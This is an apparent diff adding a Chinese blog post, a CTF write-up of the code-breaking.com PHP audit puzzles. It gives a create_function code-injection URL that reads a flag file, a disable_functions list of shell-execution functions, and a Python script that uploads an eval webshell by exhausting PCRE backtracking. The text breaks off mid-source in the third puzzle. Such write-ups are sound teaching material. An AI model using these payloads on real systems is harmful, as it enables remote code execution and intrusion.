@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="之前看到ph师傅代码审计星球的广告,看了第一道题就觉得蛮有意思的,于是就入了一波2333,简单记录一下自己能做的或是找到wp学习的题目..顺手推广一下.. 链接:https:&#x2F;&#x2F;code-breaking.com&#x2F;puzzle&#x2F;1&#x2F; easy - function源码123456789&lt;?php$action &#x3D; $_GET[&amp;#x27;action&amp;#x27;] ?? &amp;#x27;&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ph师傅的代码审计星球">
+<meta property="og:url" content="http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="之前看到ph师傅代码审计星球的广告,看了第一道题就觉得蛮有意思的,于是就入了一波2333,简单记录一下自己能做的或是找到wp学习的题目..顺手推广一下.. 链接:https:&#x2F;&#x2F;code-breaking.com&#x2F;puzzle&#x2F;1&#x2F; easy - function源码123456789&lt;?php$action &#x3D; $_GET[&amp;#x27;action&amp;#x27;] ?? &amp;#x27;&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/11/code_for_fun_1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/11/code_for_fun_2.jpg">
+<meta property="og:image" content="http://example.com/images/2018/11/code_for_fun_3.jpg">
+<meta property="og:image" content="http://example.com/images/2018/11/code_for_fun_4.jpg">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-18-11-14-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-18-13-25-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-17-14-32-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-17-26-38-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-17-30-43-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-18-15-03-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-19-20-59-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-19-31-33-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/11/2018-12-06-19-35-07-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png">
+<meta property="article:published_time" content="2018-11-30T07:17:51.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.460Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/11/code_for_fun_1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ph师傅的代码审计星球</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/12/19/hctf%E7%BA%BF%E4%B8%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/11/29/bctf2018webpart1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&text=ph师傅的代码审计星球"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&is_video=false&description=ph师傅的代码审计星球"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ph师傅的代码审计星球&body=Check out this article: http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&title=ph师傅的代码审计星球"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&name=ph师傅的代码审计星球&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/11/30/easyfunction%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/&t=ph师傅的代码审计星球"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-function"><span class="toc-number">1.</span> <span class="toc-text">easy - function</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-pcrewaf"><span class="toc-number">2.</span> <span class="toc-text">easy - pcrewaf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phpmagic"><span class="toc-number">3.</span> <span class="toc-text">easy - phpmagic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toc-number">3.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-phplimit"><span class="toc-number">4.</span> <span class="toc-text">easy - phplimit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-3"><span class="toc-number">4.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">4.2.1.</span> <span class="toc-text">get_defined_vars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.2.</span> <span class="toc-text">另一种绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ph师傅的代码审计星球
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-11-30T07:17:51.000Z" class="dt-published" itemprop="datePublished">2018-11-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>之前看到ph师傅代码审计星球的广告,看了第一道题就觉得蛮有意思的,于是就入了一波2333,简单记录一下自己能做的或是找到wp学习的题目..顺手推广一下.. 链接:<a target="_blank" rel="noopener" href="https://code-breaking.com/puzzle/1/" title="https://code-breaking.com/puzzle/1/">https://code-breaking.com/puzzle/1/</a></p>
+<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看到动态调用的action做了正则限制,所以想办法绕正则,一开始想通过范围解释操作符来绕</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如SimpleXMLElement::xpath</span><br></pre></td></tr></table></figure>
+
+<p>但是找了很久,发现很多东西都用不起来,因为很难找到第一个参数为空的有用的东西.没办法再去找了找资料 然后发现可以通过命名空间来绕过前面的限制,比如<code>var_dump</code>表示全局命名空间 <a href="/images/2018/11/code_for_fun_1.jpg"><img src="/images/2018/11/code_for_fun_1.jpg"></a> 但是又有什么函数可以第一个参数为空呢? 想到hitcon出现过的<code>create_function</code>利用多线程暴破匿名函数 显然create_function是可以用的 <a href="/images/2018/11/code_for_fun_2.jpg"><img src="/images/2018/11/code_for_fun_2.jpg"></a> 弃用无所谓,后面发现还是可以用的 <code>create_function</code>可能存在的问题也很明显,就是代码注入,比如 <a href="/images/2018/11/code_for_fun_3.jpg"><img src="/images/2018/11/code_for_fun_3.jpg"></a> 从而可以任意代码执行,但是又碰到问题了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disable functions</span><br><span class="line"></span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
+
+<p>想到flag肯定是文件形式,那么用<code>scandir</code>就好,在上一级目录发现flag <a href="/images/2018/11/code_for_fun_4.jpg"><img src="/images/2018/11/code_for_fun_4.jpg"></a> 用<code>file_get_contents</code>获取flag,最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=create_function&amp;arg=echo%20%22123%22;&#125;var_dump(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));/*</span><br></pre></td></tr></table></figure>
+
+<p>拿到返回</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Deprecated: Function <span class="title function_ invoke__">create_function</span>() is deprecated in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Warning: Unterminated comment starting line <span class="number">1</span> in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">8</span>) : runtime-created <span class="function"><span class="keyword">function</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br><span class="line"><span class="function"><span class="title">string</span>(<span class="params"><span class="number">38</span></span>) &quot;<span class="title">flag</span></span>&#123;<span class="number">03</span>fdc0ee2fc464aac3c40ef0e20dcb5a&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_php</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>, <span class="number">0755</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$user_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$path</span>&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>一开始头铁,觉得能过这个正则.. 也确实可以,在php7以下可用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>具体可以去看php的源码 php7之前的最高版本5.6.39 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l" title="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l">https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l</a> <a href="/images/2018/11/2018-12-06-18-11-14-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-18-11-14-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 而一到php7就没这种解析了 <a href="/images/2018/11/2018-12-06-18-13-25-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/11/2018-12-06-18-13-25-%E5%88%9B%E5%BB%BA%E7%9A%84%E6%88%AA%E5%9B%BE.png"></a> 而目标环境就是php7,到这里我就已经不会了… 后来看的wp <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a> 说到底就是PHP的pcre.backtrack_limit限制利用,当回溯次数超过限制的时候,正则表达式会返回false,而不是0或1 那么就可以利用这个点来进行攻击,poc的话前面的链接也有</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
+
+<p>想要避免这个问题,在使用的时候用<code>===</code>来判断而不是<code>==</code>或直接判断</p>
+<h1 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read-source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATA_DIR&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(DATA_DIR)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(DATA_DIR, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(DATA_DIR);</span><br><span class="line"></span><br><span class="line"><span class="variable">$domain</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$log_name</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>] : <span class="title function_ invoke__">date</span>(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- Required meta tags --&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap CSS --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css&quot;</span> integrity=<span class="string">&quot;sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Domain Detail&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    pre &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        background-color: <span class="comment">#f6f8fa;</span></span><br><span class="line">        border-radius: <span class="number">3</span>px;</span><br><span class="line">        font-size: <span class="number">85</span>%;</span><br><span class="line">        line-height: <span class="number">1.45</span>;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: <span class="number">16</span>px;</span><br><span class="line">        border: <span class="number">1</span>px solid <span class="comment">#ced4da;</span></span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span 